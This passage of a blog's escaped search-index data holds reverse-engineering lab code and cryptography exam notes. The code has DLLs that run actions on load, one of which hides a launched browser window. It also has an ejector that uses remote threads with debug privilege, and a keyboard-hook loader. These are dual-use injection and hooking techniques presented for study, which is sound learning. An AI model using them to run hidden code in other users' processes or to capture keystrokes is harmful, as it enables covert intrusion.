class=\"headerlink\" title=\"DllMain\"></a>DllMain</h3><ul>\n<li>获得当前DLL的句柄</li>\n<li>根据fdwReason执行创建线程的程序部分<code>[CreateThread]</code></li>\n<li>关闭一个打开的对象句柄<code>[CloseHandle]</code></li>\n</ul>\n<h3 id=\"ThreadProc\"><a href=\"#ThreadProc\" class=\"headerlink\" title=\"ThreadProc\"></a>ThreadProc</h3><ul>\n<li>得到当前运行程序所在目录<code>[GetModuleFileName]</code></li>\n<li>从右查找以“\\”起始的字符串<code>[_tcsrchr]</code></li>\n<li>拷贝字符串并添加文件名：所在文件夹目录名+”index.html”<code>[_tcscpy_s]</code></li>\n<li>下载网页成html<code>[URLDownloadToFile]</code></li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"windows.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"tchar.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//和URlDownloadToFile()函数有关</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">pragma</span> comment(lib, <span class=\"meta-string\">\"urlmon.lib\"</span>)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//当前DLL实例的句柄</span></span><br><span class=\"line\">HMODULE g_hMod = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">DWORD WINAPI <span class=\"title\">ThreadProc</span><span class=\"params\">(LPVOID lParam)</span> </span>&#123;</span><br><span class=\"line\">    TCHAR szPath[MAX_PATH] = &#123;<span class=\"number\">0</span>,&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//GetModuleFileName-&gt;得到当前运行程序所在目录</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">    TCHAR *p = _tcsrchr( szPath, <span class=\"string\">'\\\\'</span> );</span><br><span class=\"line\">    <span class=\"comment\">//_tcsrchr-&gt;从右查找以“\\\\”起始的字符串</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !p )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//_tcscpy_s-&gt;拷贝字符串并添加文件名：所在文件夹目录名+\"index.html\"</span></span><br><span class=\"line\">    _tcscpy_s(p+<span class=\"number\">1</span>, MAX_PATH, <span class=\"string\">L\"index.html\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">//也可写作lstrcpy(p+1, _T(“index.html”) );</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">//URLDownloadToFile-&gt;下载网页成html</span></span><br><span class=\"line\">    URLDownloadToFile(<span class=\"literal\">NULL</span>, <span class=\"string\">L\"http://www.xidian.edu.cn\"</span> , szPath, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//DllMain一般为DLL的函数入口</span></span><br><span class=\"line\"><span class=\"function\">BOOL WINAPI <span class=\"title\">DllMain</span><span class=\"params\">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> </span>&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    HANDLE hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//获得当前DLL的句柄</span></span><br><span class=\"line\">    g_hMod = (HMODULE)hinstDLL;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>( fdwReason )<span class=\"comment\">//fdwReason指明了系统调用Dll的原因</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_PROCESS_ATTACH:<span class=\"comment\">//当一个DLL文件被映射到进程的地址空间时，系统调用该DLL的DllMain函数 </span></span><br><span class=\"line\">        <span class=\"comment\">//创建进程</span></span><br><span class=\"line\">        hThread = CreateThread(<span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, ThreadProc, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">        <span class=\"comment\">//关闭一个打开的对象句柄</span></span><br><span class=\"line\">        CloseHandle(hThread);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MyDll2-cpp\"><a href=\"#MyDll2-cpp\" class=\"headerlink\" title=\"MyDll2.cpp\"></a>MyDll2.cpp</h2><h3 id=\"DllMain-1\"><a href=\"#DllMain-1\" class=\"headerlink\" title=\"DllMain\"></a>DllMain</h3><ul>\n<li>根据fdwReason选择执行接下来的步骤</li>\n<li>获得当前DLL被装载到的进程的可执行文件的路径到szPath中<code>[GetModuleFileName]</code></li>\n<li>从右面开始查找”\\“<code>[_tcsrchr]</code></li>\n<li>比较程序的名称是否为notepad.exe<code>[lstrcmpi]</code></li>\n<li>调用IE访问<code>[wsprintf]</code></li>\n<li>创建新进程<code>[CreateProcess]</code></li>\n<li>关闭一个打开的对象句柄<code>[CloseHandle]</code></li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"windows.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"tchar.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL WINAPI <span class=\"title\">DllMain</span><span class=\"params\">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//存放cmd命令的字符串数组</span></span><br><span class=\"line\">    TCHAR szCmd[MAX_PATH]  = &#123;<span class=\"number\">0</span>,&#125;;</span><br><span class=\"line\">    <span class=\"comment\">//存放路径的字符串数组</span></span><br><span class=\"line\">    TCHAR szPath[MAX_PATH] = &#123;<span class=\"number\">0</span>,&#125;;</span><br><span class=\"line\">    TCHAR *p = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//STARTUPINFO结构 该结构用于指定新进程的主窗口特性</span></span><br><span class=\"line\">    STARTUPINFO si = &#123;<span class=\"number\">0</span>,&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//该结构返回有关新进程及其主线程的信息</span></span><br><span class=\"line\">    PROCESS_INFORMATION pi = &#123;<span class=\"number\">0</span>,&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    si.cb = <span class=\"keyword\">sizeof</span>(STARTUPINFO);</span><br><span class=\"line\">    si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class=\"line\">    si.wShowWindow = SW_HIDE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>( fdwReason ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_PROCESS_ATTACH: </span><br><span class=\"line\">        <span class=\"comment\">//获得当前DLL被装载到的进程的可执行文件的路径到szPath中</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !GetModuleFileName( <span class=\"literal\">NULL</span>, szPath, MAX_PATH ) )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//从右面开始查找\"\\\\\"</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !(p = _tcsrchr(szPath, <span class=\"string\">'\\\\'</span>)) )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//比较程序的名称是否为notepad.exe</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( lstrcmpi(p+<span class=\"number\">1</span>, _T(<span class=\"string\">\"notepad.exe\"</span>)) )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//调用IE访问www.xidian.edu.cn</span></span><br><span class=\"line\">        wsprintf(szCmd, _T(<span class=\"string\">\"%s %s\"</span>), _T(<span class=\"string\">\"c:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"</span>), _T(<span class=\"string\">\"http://www.xidian.edu.cn\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//创建新进程</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !CreateProcess(<span class=\"literal\">NULL</span>, (LPTSTR)(LPCTSTR)szCmd, </span><br><span class=\"line\">                            <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;si, &amp;pi) )</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>( pi.hProcess != <span class=\"literal\">NULL</span> )</span><br><span class=\"line\">            CloseHandle(pi.hProcess);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EjectDll-cpp\"><a href=\"#EjectDll-cpp\" class=\"headerlink\" title=\"EjectDll.cpp\"></a>EjectDll.cpp</h2><h3 id=\"tmain-1\"><a href=\"#tmain-1\" class=\"headerlink\" title=\"_tmain\"></a>_tmain</h3><ul>\n<li>通过名字找PID<code>[FindProcessID]</code></li>\n<li>更改特权<code>[SetPrivilege]</code></li>\n<li>卸载DLL<code>[EjectDll]</code></li>\n</ul>\n<h3 id=\"FindProcessID\"><a href=\"#FindProcessID\" class=\"headerlink\" title=\"FindProcessID\"></a>FindProcessID</h3><ul>\n<li>获得系统进程的快照</li>\n<li>获取进程信息为指定的进程等的一个快照<code>[CreateToolhelp32Snapshot]</code></li>\n<li>进程获取<code>[process32First]</code></li>\n<li>继续枚举下个模块结构字段信息<code>[Process32Next]</code></li>\n<li>关闭一个打开的对象句柄<code>[CloseHandle]</code></li>\n</ul>\n<h3 id=\"SetPrivilege-1\"><a href=\"#SetPrivilege-1\" class=\"headerlink\" title=\"SetPrivilege\"></a>SetPrivilege</h3><ul>\n<li>获取进程的令牌句柄<code>[OpenProcessToken]</code></li>\n<li>函数查看系统权限的特权值，返回信息到一个LUID结构体里<code>[LookupPrivilegeValue]</code></li>\n<li>启用或禁止，指定访问令牌的特权<code>[AdjustTokenPrivileges]</code></li>\n<li>有错误则输出错误信息<code>[GetLastError]</code></li>\n</ul>\n<h3 id=\"EjectDll\"><a href=\"#EjectDll\" class=\"headerlink\" title=\"EjectDll\"></a>EjectDll</h3><ul>\n<li>获得加载到notepad进程地址空间的DLL信息<code>[CreateToolhelp32Snapshot]</code></li>\n<li>继续枚举下个模块结构字段信息<code>[Module32First/ Module32First]</code></li>\n<li>打开一个已存在的进程对象<code>[OpenProcess]</code></li>\n<li>创建远程线程<code>[GetModuleHandle/GetProcAddress/CreateRemoteThread]</code></li>\n<li>关闭一个打开的对象句柄<code>[CloseHandle]</code></li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// EjectDll.exe</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"windows.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"tlhelp32.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"tchar.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//查找该进程下有没有加载该DLL模块</span></span><br><span class=\"line\">    <span class=\"comment\">//由进程名找到进程id号</span></span><br><span class=\"line\"><span class=\"function\">DWORD <span class=\"title\">FindProcessID</span><span class=\"params\">(LPCTSTR szProcessName)</span> </span>&#123;</span><br><span class=\"line\">    DWORD dwPID = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\">    HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class=\"line\">    <span class=\"comment\">//用来存放快照进程信息的一个结构体</span></span><br><span class=\"line\">    PROCESSENTRY32 pe;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获得系统进程的快照</span></span><br><span class=\"line\">    pe.dwSize = <span class=\"keyword\">sizeof</span>( PROCESSENTRY32 );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//CreateToolhelp32Snapshot-&gt;可以通过获取进程信息为指定的进程、进程使用的堆[HEAP]、模块[MODULE]、线程建立一个快照</span></span><br><span class=\"line\">    hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, <span class=\"literal\">NULL</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//process32First-&gt;是一个进程获取函数</span></span><br><span class=\"line\">    <span class=\"comment\">//当利用CreateToolhelp32Snapshot()获得当前运行进程的快照后，可以利用process32First函数来获得第一个进程的句柄</span></span><br><span class=\"line\">    Process32First(hSnapShot, &amp;pe);</span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123;</span><br><span class=\"line\">            dwPID = pe.th32ProcessID;</span><br><span class=\"line\">            <span class=\"comment\">//如果已经加载，则退出</span></span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">while</span>(Process32Next(hSnapShot, &amp;pe));</span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle(hSnapShot);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> dwPID;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//设置程序权限(同InjectDll.cpp)</span></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">SetPrivilege</span><span class=\"params\">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> </span>&#123;</span><br><span class=\"line\">    TOKEN_PRIVILEGES tp;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\">    LUID luid;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !OpenProcessToken(GetCurrentProcess(),</span><br><span class=\"line\">           TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !LookupPrivilegeValue(<span class=\"literal\">NULL</span>,           <span class=\"comment\">// lookup privilege on local system</span></span><br><span class=\"line\">                              lpszPrivilege,  <span class=\"comment\">// privilege to lookup </span></span><br><span class=\"line\">                              &amp;luid) )        <span class=\"comment\">// receives LUID of privilege</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE; </span><br><span class=\"line\"></span><br><span class=\"line\">    tp.PrivilegeCount = <span class=\"number\">1</span>;</span><br><span class=\"line\">    tp.Privileges[<span class=\"number\">0</span>].Luid = luid;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( bEnablePrivilege )</span><br><span class=\"line\">        tp.Privileges[<span class=\"number\">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        tp.Privileges[<span class=\"number\">0</span>].Attributes = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Enable the privilege or disable all privileges.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !AdjustTokenPrivileges(hToken, FALSE, &amp;tp, </span><br><span class=\"line\">         <span class=\"keyword\">sizeof</span>(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) <span class=\"literal\">NULL</span>, (PDWORD) <span class=\"literal\">NULL</span>) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( GetLastError() == ERROR_NOT_ALL_ASSIGNED )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">BOOL <span class=\"title\">EjectDll</span><span class=\"params\">(DWORD dwPID, LPCTSTR szDllName)</span> </span>&#123;</span><br><span class=\"line\">    BOOL bMore = FALSE, bFound = FALSE;</span><br><span class=\"line\">    HANDLE hSnapshot, hProcess, hThread;</span><br><span class=\"line\">    HMODULE hModule = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    MODULEENTRY32 me = &#123; <span class=\"keyword\">sizeof</span>(me) &#125;;</span><br><span class=\"line\">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// dwPID = notepad进程的id号</span></span><br><span class=\"line\">    <span class=\"comment\">// 使用TH32CS_SNAPMODULE参数，获得加载到notepad进程地址空间的DLL信息</span></span><br><span class=\"line\">    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);</span><br><span class=\"line\"></span><br><span class=\"line\">    bMore = Module32First(hSnapshot, &amp;me);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>( ; bMore ; bMore = Module32Next(hSnapshot, &amp;me) )&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || </span><br><span class=\"line\">            !_tcsicmp((LPCTSTR)me.szExePath, szDllName) )&#123;</span><br><span class=\"line\">            bFound = TRUE;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !bFound )&#123;</span><br><span class=\"line\">        CloseHandle(hSnapshot);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> FALSE;</span><br><span class=\"line\"></span><br><span class=\"line\">    hModule = GetModuleHandle(<span class=\"string\">L\"kernel32.dll\"</span>);</span><br><span class=\"line\">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span class=\"string\">\"FreeLibrary\"</span>);</span><br><span class=\"line\">    hThread = CreateRemoteThread(hProcess, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>, </span><br><span class=\"line\">                                 pThreadProc, me.modBaseAddr, </span><br><span class=\"line\">                                 <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    WaitForSingleObject(hThread, INFINITE); </span><br><span class=\"line\"></span><br><span class=\"line\">    CloseHandle(hThread);</span><br><span class=\"line\">    CloseHandle(hProcess);</span><br><span class=\"line\">    CloseHandle(hSnapshot);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> _tmain(<span class=\"keyword\">int</span> argc, TCHAR* argv[]) &#123;</span><br><span class=\"line\">    DWORD dwPID = <span class=\"number\">0xFFFFFFFF</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    dwPID = FindProcessID(<span class=\"string\">L\"notepad.exe\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>( dwPID == <span class=\"number\">0xFFFFFFFF</span> ) <span class=\"comment\">//没有找到notepad进程</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 更改特权</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( !SetPrivilege(SE_DEBUG_NAME, TRUE) )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 卸载DLL</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( EjectDll(dwPID, <span class=\"string\">L\"MyDll.dll\"</span>) )</span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"EjectDll(%d, \\\"%s\\\") success!!!\\n\"</span>, dwPID, <span class=\"string\">L\"MyDll.dll\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        _tprintf(<span class=\"string\">L\"EjectDll(%d, \\\"%s\\\") failed!!!\\n\"</span>, dwPID, <span class=\"string\">L\"MyDll.dll\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TestHook-cpp\"><a href=\"#TestHook-cpp\" class=\"headerlink\" title=\"TestHook.cpp\"></a>TestHook.cpp</h2><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"stdio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"conio.h\"</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"windows.h\"</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">void</span> <span class=\"params\">(*PFN_HOOKSTART)</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">void</span> <span class=\"params\">(*PFN_HOOKSTOP)</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    HMODULE         hDll = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    PFN_HOOKSTART   HookStart = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    PFN_HOOKSTOP    HookStop = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    hDll = LoadLibraryA(<span class=\"string\">\"HookDll.dll\"</span>); <span class=\"comment\">// 装载HookDll.dll</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( hDll == <span class=\"literal\">NULL</span> )</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获取导出函数HookStart()和HookStop()的地址</span></span><br><span class=\"line\">    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, <span class=\"string\">\"HookStart\"</span>);</span><br><span class=\"line\">    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, <span class=\"string\">\"HookStop\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    HookStart(); <span class=\"comment\">//开始钩取键盘消息</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 等到用户输入'q'才终止钩取</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"press 'q' to quit!\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( _getch() != <span class=\"string\">'q'</span> )    ;</span><br><span class=\"line\"></span><br><span class=\"line\">    HookStop(); <span class=\"comment\">//终止钩取键盘消息</span></span><br><span class=\"line\"></span><br><span class=\"line\">    FreeLibrary(hDll); <span class=\"comment\">//卸载HookDll.dll</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n","categories":["技术"],"tags":["逆向"]},{"title":"现代密码学复习整理","url":"https://littleghost2016.github.io/2018/01/07/现代密码学复习整理/","content":"<h1 id=\"第一章（公钥）\"><a href=\"#第一章（公钥）\" class=\"headerlink\" title=\"第一章（公钥）\"></a>第一章（公钥）</h1><ol>\n<li><p>信息系统面临的人为攻击主可分为哪两类？每一类各包括哪几种攻击。<br>主动攻击（中断、篡改、伪造）和被动攻击（获取信息内容、业务流分析）。</p>\n</li>\n<li><p>信息安全的基本模型是什么样的。<br>​    <img src=\"clip_image002.jpg\" alt=\"img\"></p>\n</li>\n<li><p>为了保护信息的保密性，抗击密码分析，保密系统应当满足什么要求; Kerckhoffs原则的含义。</p>\n</li>\n</ol>\n<ul>\n<li>从截获的密文或某些已知明文密文对，要决定密钥或任意明文在计算上是不可行的</li>\n<li>系统的保密性不依赖于对加密体制或算法的保密，而依赖于密钥（Kerckhoffs原则）</li>\n<li>加密和解密算法适用于密钥空间中的所有元素</li>\n<li>系统便于实现和使用</li>\n</ul>\n<ol start=\"4\">\n<li><p>安全业务的种类<br>保密、认证、完整性、不可否认、访问控制</p>\n</li>\n<li><p>对密码系统的攻击的类型<br>唯密文、已知明文、选择明文、选择密文</p>\n</li>\n</ol>\n<h1 id=\"第二章\"><a href=\"#第二章\" class=\"headerlink\" title=\"第二章\"></a>第二章</h1><ol>\n<li>流密码的基本概念</li>\n<li>反馈移位寄存器的输出和周期，例2-2，例2-3。</li>\n<li>产生m序列的充分必要条件。</li>\n<li>P（x）为本原多项式</li>\n</ol>\n<h1 id=\"第三章\"><a href=\"#第三章\" class=\"headerlink\" title=\"第三章\"></a>第三章</h1><ol>\n<li><p>分组密码概述</p>\n</li>\n<li><p>DES算法的加密算法结构，S盒的输入和输出的定义；<br>输入6比特，输出4比特</p>\n</li>\n<li><p>分组密码的运行模式有哪些，它们的错误传播特点？CBC模式的错误传播是什么样的。<br>ECB/CBC明文出错：影响所有密文；密文出错，影响本组和下一组密文/<br>CFB密文出错1比特，影响（例如8比特）（8/1）+1组</p>\n</li>\n<li><p>AES密码算法的分组长度，密钥长度和迭代轮数的关系，与密钥扩展所需比特数的关系；<br>AES密码算法的轮函数组成；<br>分组长度和密钥长度可变（128/192/256）</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>4</th>\n<th>6</th>\n<th>8</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>4</td>\n<td>10</td>\n<td>12</td>\n<td>14</td>\n</tr>\n<tr>\n<td>6</td>\n<td>12</td>\n<td>12</td>\n<td>14</td>\n</tr>\n<tr>\n<td>8</td>\n<td>14</td>\n<td>14</td>\n<td>14</td>\n</tr>\n<tr>\n<td>轮密钥的比特数=分组长度*轮数+1</td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n</li>\n<li><p>中国商用密码算法SM4的基本情况，例如分组长度，密钥长度，迭代轮数；</p>\n</li>\n</ol>\n<h1 id=\"第四章\"><a href=\"#第四章\" class=\"headerlink\" title=\"第四章\"></a>第四章</h1><ol>\n<li>公钥密码体制的基本概念；</li>\n<li>RSA算法的细节，例如密钥的产生，加密和解密运算，解密运算的正确性证明。</li>\n<li>Rabin密码体制的安全基础。</li>\n<li>椭圆曲线密码体制的安全基础，椭圆曲线群的点如何确定，点的加法和倍数运算如何定义。</li>\n<li>中国商用椭圆曲线密码算法标准SM2的安全基础。</li>\n</ol>\n<h1 id=\"第五章\"><a href=\"#第五章\" class=\"headerlink\" title=\"第五章\"></a>第五章</h1><ol>\n<li>单钥和公钥加密体制的密钥分配的基本方法</li>\n<li>随机数序列在密码学应用中应该满足什么要求；随机数的产生方法。</li>\n<li>秘密分割或秘密共享的概念，门限方案的概念；</li>\n</ol>\n<h1 id=\"第六章\"><a href=\"#第六章\" class=\"headerlink\" title=\"第六章\"></a>第六章</h1><ol>\n<li>消息认证码的定义及使用方式；</li>\n<li>哈希函数的定义，相关概念，使用方式；</li>\n<li>MD5哈希算法的基本描述，算法框图；</li>\n<li>SHA算法的基本描述；、</li>\n<li>SM3哈希算法的基本情况；</li>\n</ol>\n<h1 id=\"第七章\"><a href=\"#第七章\" class=\"headerlink\" title=\"第七章\"></a>第七章</h1><ol>\n<li>数字签名的基本概念</li>\n<li>DSS数字签名标准，DSA数字签名算法；</li>\n<li>认证协议的基本概念，相互认证，单向认证。</li>\n</ol>\n","categories":["技术"],"tags":["密码学"]},{"title":"现代密码学上机作业","url":"https://littleghost2016.github.io/2018/01/02/现代密码学上机作业/","content":"<h1 id=\"实现RSA算法\"><a href=\"#实现RSA算法\" class=\"headerlink\" title=\"实现RSA算法\"></a>实现RSA算法</h1><h2 